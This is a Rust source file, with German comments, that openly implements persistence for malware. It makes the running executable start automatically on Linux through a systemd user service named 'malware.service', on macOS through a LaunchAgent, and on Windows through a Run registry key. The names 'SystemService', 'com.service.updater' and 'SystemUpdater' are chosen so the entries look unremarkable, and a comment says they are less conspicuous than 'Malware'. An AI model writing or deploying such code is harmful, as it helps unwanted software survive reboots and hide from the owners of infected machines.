// Für jedes Betriebssystem wird nur der passende Code-Block komopiliert

use anyhow::{Context, Result};
use std::fs;
use std::process::Command;

/// Richtet den Autostart für das aktuelle Betriebssystem ein.
///
/// Diese Funktion entscheidet zur Kompilierzeit, welche Logik verwendet wird.
pub fn enable_autostart() -> Result<()> {
    enable_autostart_internal()
}

#[cfg(target_os = "linux")]
fn enable_autostart_internal() -> Result<()> {
    let home = dirs::home_dir().context("Konnte Home-Verzeichnis nicht finden")?;
    let service_dir = home.join(".config/systemd/user");

    fs::create_dir_all(&service_dir)?;

    let exe = std::env::current_exe()?;
    let service_content = format!(
        "[Unit]\nDescription=SystemService\n\n[Service]\nExecStart={}\nRestart=always\n\n[Install]\nWantedBy=default.target\n",
        exe.display()
    );

    fs::write(service_dir.join("malware.service"), service_content)?;

    // Service aktivieren (Fehler hier sind nicht kritisch, aber sollten protokolliert werden)
    let _ = Command::new("systemctl")
        .args(["--user", "enable", "malware"])
        .status();

    Ok(())
}

#[cfg(target_os = "macos")]
fn enable_autostart_internal() -> Result<()> {
    let home = dirs::home_dir().context("Konnte Home-Verzeichnis nicht finden")?;
    let agents_dir = home.join("Library/LaunchAgents");

    fs::create_dir_all(&agents_dir)?;

    let exe = std::env::current_exe()?;
    let plist = format!(
        r#"<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
  <key>Label</key><string>com.service.updater</string>
  <key>ProgramArguments</key>
  <array><string>{}</string></array>
  <key>RunAtLoad</key><true/>
</dict>
</plist>"#,
        exe.display()
    );

    fs::write(agents_dir.join("com.service.updater.plist"), plist)?;
    Ok(())
}

#[cfg(target_os = "windows")]
fn enable_autostart_internal() -> Result<()> {
    let exe = std::env::current_exe()?;

    // Unter Windows ist 'reg' normalerweise vorhanden.
    Command::new("reg")
        .args([
            "add",
            r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run",
            "/v",
            "SystemUpdater", // Unauffälligerer Name als "Malware"
            "/t",
            "REG_SZ",
            "/d",
            &exe.display().to_string(),
            "/f",
        ])
        .status()
        .context("Fehler beim Ausführen des reg-Befehls")?;

    Ok(())
}

// Fallback für unbekannte Systeme (z.B. BSD), damit es kompiliert
#[cfg(not(any(target_os = "linux", target_os = "macos", target_os = "windows")))]
fn enable_autostart_internal() -> Result<()> {
    Ok(())
}
